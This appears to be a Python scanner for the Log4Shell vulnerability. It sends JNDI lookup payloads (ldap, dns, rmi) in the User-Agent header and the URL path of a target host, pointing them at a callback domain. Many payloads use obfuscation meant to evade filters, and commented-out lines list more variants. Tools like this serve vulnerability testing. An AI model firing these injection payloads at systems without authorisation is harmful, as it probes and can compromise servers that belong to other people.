#!/usr/bin/env python3

# With inspirations from Northwave and KPN, combined with my own styling

import argparse
import requests
import uuid
import logging
import urllib3
import time
import sys
import os
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)


def argparsing(exec_file):
    parser = argparse.ArgumentParser(exec_file)
    parser.add_argument("--reply-fqdn",
                        dest='replyfqdn',
                        help="Reply FQDN",
                        default='log4jdnsreq.cyberz.nl',
                        type=str)
    parser.add_argument("--target",
                        dest='target',
                        help="Target host to examine",
                        default=None,
                        type=str)
    parser.add_argument("--timeout",
                        dest='timeout',
                        help="Timeout",
                        default=15,
                        type=int)


    return parser

def check1(schema, url_input, reply_host, header_name, payl, timeout):
    logging.info(f"check1: Sending request to {schema}{url_input.hostname} using {header_name} injecting {payl}")

    # Check 1 (User Agent)
    try:
        requests.get(
            f"{schema}{url_input.hostname}",
            headers={header_name: payl},
            verify=False,
            timeout=timeout
        )
    except requests.exceptions.ConnectionError as e:
        logging.error(f"HTTP connection to {schema}{url_input.hostname} URL error: {e}")

def check2(schema, url_input, reply_host, payl, timeout):
    logging.info(f"check2: Sending request to {schema}{url_input.hostname} injecting {payl}")

    # Check 2 (Get request)
    try:
        requests.get(
            f"{schema}{url_input.hostname}/{payl}",
            verify=False,
            timeout=timeout
        )
    except requests.exceptions.ConnectionError as e:
        logging.error(f"HTTP connection to {schema}{url_input.hostname} URL error: {e}")


def deliver(url_input, reply_host, header_name, payl, timeout):
    schema = ['http://', 'https://']

    for s in schema:
        check1(s, url_input, reply_host, header_name, payl, timeout)
        check2(s, url_input, reply_host, payl, timeout)


def payload_generation(url_input, reply_host, timeout):
    identifier = uuid.uuid4()
    logging.debug(f"Generated UUID: {identifier}")


    payloads = []
    payloads.append(f'${{jndi:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{jndi:dns://{identifier}.{url_input.hostname}.{reply_host}:53/test.class}}')
    payloads.append(f'${{jndi:rmi://{identifier}.{url_input.hostname}.{reply_host}:1099/test.class}}')

    payloads.append(f'${{${{::-j}}ndi:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}di:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}i:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}mi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}i://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')

#${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
#${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
#${jndi:rmi://adsasd.asdasd.asdasd}
#${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
#${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
#${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
#${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}


    header_name = 'User-Agent'

    for payl in payloads:
        deliver(url_input, reply_host, header_name, payl, timeout)


def main():
    # Arguments parsing
    argparser = argparsing(os.path.basename(__file__))
    args = argparser.parse_args()

    # No target, no dice
    if not args.target:
        argparser.print_help()
        sys.exit(1)

    # Parse URL
    url_input = urlparse(args.target)
    if url_input.hostname is None or not url_input.hostname:
        url_input = urlparse('dummy://' + args.target)

    # Generate payload and run it
    payload_generation(url_input, args.replyfqdn, args.timeout)


if __name__ == "__main__":
    main()
